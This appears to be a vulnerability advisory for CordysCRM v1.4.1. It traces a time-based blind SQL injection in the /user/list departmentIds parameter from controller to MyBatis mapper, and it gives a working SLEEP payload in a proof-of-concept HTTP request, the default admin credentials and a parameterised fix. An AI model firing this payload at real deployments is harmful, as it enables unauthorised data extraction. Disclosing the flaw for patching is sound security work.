# [Security Vulnerability] SQL Injection in CordysCRM `/user/list` via `departmentIds

Affected Version: Latest (Tested on v1.4.1) 

Vendor: [1Panel-dev/CordysCRM](https://github.com/1Panel-dev/CordysCRM) 

Software: CordysCRM 

Vulnerability Type:SQL Injection (Time-Based Blind) 

Severity:** High

**Vulnerability Files:**

- `backend/crm/src/main/java/cn/cordys/crm/system/controller/OrganizationUserController.java` (Input Entry)
- `backend/crm/src/main/java/cn/cordys/crm/system/service/OrganizationUserService.java` (Unsafe Source)
- `backend/crm/src/main/java/cn/cordys/crm/system/mapper/ExtOrganizationUserMapper.xml` (Execution Sink)

## 1. Description

A high-severity SQL injection vulnerability exists in the employee list query interface (`/user/list`).

**Details:**

- **Injection Point:** The `departmentIds` parameter in the JSON body.
- **Cause:** The backend service (`OrganizationUserService.java`) manually concatenates SQL strings using user input without proper sanitization (manually adding single quotes). This string is then directly executed in the MyBatis Mapper XML using the unsafe `${}` syntax within an `ORDER BY` clause.
- **Constraint:** Due to global exception handling (JDBC Rollback), error-based injection is suppressed. However, **Time-Based Blind injection** is fully effective.
- **Prerequisite:** A **valid department ID** must be included in the injected array to ensure the `WHERE` clause returns data, forcing the database optimizer to execute the `ORDER BY` sorting phase where the injection resides.

## 2. Root Cause Analysis

The vulnerability stems from the insecure data flow across three layers:

**Step 1: Input Entry (Controller)** The controller binds the JSON body to the `UserPageRequest` object. The `departmentIds` parameter is accepted without validation. *File:* `OrganizationUserController.java`

<img width="1758" height="1329" alt="40e7e5fdb2a866419b0942d499f1ca4a" src="https://github.com/user-attachments/assets/e770c68a-ae55-4f94-adcf-b523951c460c" />

```
@PostMapping("/list")
public Pager<List<UserPageResponse>> list(@Validated @RequestBody UserPageRequest request) {
    // The request object contains the malicious 'departmentIds' list
    return PageUtils.setPageInfo(page, organizationUserService.list(request));
}
```

**Step 2: Unsafe String Concatenation (Service - The Source)** The method `buildOrderByFieldClause` manually adds single quotes around user input, allowing attackers to break out of the quote. *File:* `OrganizationUserService.java`

<img width="1617" height="939" alt="afad9a73d8f70c5bbb45f3b2f74815a2" src="https://github.com/user-attachments/assets/46a66cf7-3d10-43e1-99c2-9dcf5b6fe68c" />

```
private String buildOrderByFieldClause(List<String> departmentIds) {
    StringJoiner sj = new StringJoiner(",", "FIELD(department_id, ", ")");
    for (String deptId : departmentIds) {
        sj.add("'" + deptId + "'"); // <--- VULNERABILITY: Direct concatenation
    }
    return sj.toString();
}
```

**Step 3: Unsafe Execution (Mapper XML - The Sink)** The `orderByClause` string is injected directly into the SQL query using `${}`. This bypasses PreparedStatement protection. *File:* `ExtOrganizationUserMapper.xml`
<img width="1623" height="1245" alt="631a2303a59b84c61a008cb024894d93" src="https://github.com/user-attachments/assets/06645792-2842-4bbe-af8a-3f1aca342519" />
<img width="1692" height="1320" alt="bdf4dd50616f80f7e0f41bea8167bc61" src="https://github.com/user-attachments/assets/881abc1f-aa33-4b09-96a7-dc197b1cd69b" />


XML

```
<select id="list" resultType="cn.cordys.crm.system.dto.response.UserPageResponse">
    SELECT ... FROM sys_organization_user sou
    <include refid="sorts">
        <property name="sort" value="request.sort"/>
    </include>
</select>

<sql id="sorts">
    <choose>
        <otherwise>
            ORDER BY
            sou.enable DESC,
            ${orderByClause}, is_commander DESC
        </otherwise>
    </choose>
</sql>
```

## 3. Proof of Concept (POC)

**Step 1:** Log in to the application via the web interface (default credentials are typically `admin` / `CordysCRM`)  **Step 2:** Identify a valid `departmentId` (e.g., `868820344381440`) from the system. **Step 3:** Send the following malicious HTTP request

<img width="1250" height="642" alt="3641b756cfbd3728c244c4a39afda9d7" src="https://github.com/user-attachments/assets/5042168c-c57f-4f4e-a0f3-2cf59be31d8a" />


HTTP

```
POST /user/list HTTP/1.1
Host: ip:8081
Accept: application/json, text/plain, */*
Origin: http://ip:8081
Accept-Encoding: gzip, deflate
X-AUTH-TOKEN: a02ebc8c-83c7-45e6-9a48-95c249ef8cb8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Referer: http://ip:8081/
Accept-Language: zh-CN
Content-Type: application/json;charset=UTF-8
CSRF-TOKEN: CYkmuI1mFPJzzgCqqe7HRA37AAw+I8J/qzbRjXiVWJO0XbmCcRvNx+WQCOzTLfM6oUzUK8fUPN/skLYEWi3SDw23e4fH5TalUE6d1NfoTw==
Content-Length: 184

{
  "current": 1,
  "pageSize": 30,
  "combineSearch": { "searchMode": "AND", "conditions": [] },
  "keyword": "",
  "departmentIds": [
    "868820344381440",
    "1') AND (SELECT SLEEP(10)) AND ('1"
  ],
  "filters": []
}
```
<img width="2396" height="896" alt="e2ce326800d22bd46b4c4ac300cde199" src="https://github.com/user-attachments/assets/8e244bb3-3cc4-4595-ae07-1bd3fa42bf02" />

**Result:** The server response will be delayed by approximately **10 seconds**, confirming that the `SLEEP(10)` command was executed by the database.

## 4. Impact

- **Data Exfiltration:** Attackers can extract sensitive data (e.g., administrator password hashes, customer information) character-by-character using Time-Based Blind injection.
- **System Compromise:** Depending on the database user's privileges, this could lead to full system takeover.

## 5. Remediation

**Recommendation:** Avoid manual string concatenation for SQL logic. Use MyBatis `<foreach>` tag to iterate over the collection and use `#{}` (PreparedStatement) to bind parameters securely.

**Patch Example (XML):**

```
<if test="request.departmentIds != null and request.departmentIds.size() > 0">
    ORDER BY FIELD(department_id,
    <foreach collection="request.departmentIds" item="id" separator=",">
        #{id}
    </foreach>
    )
</if>
```
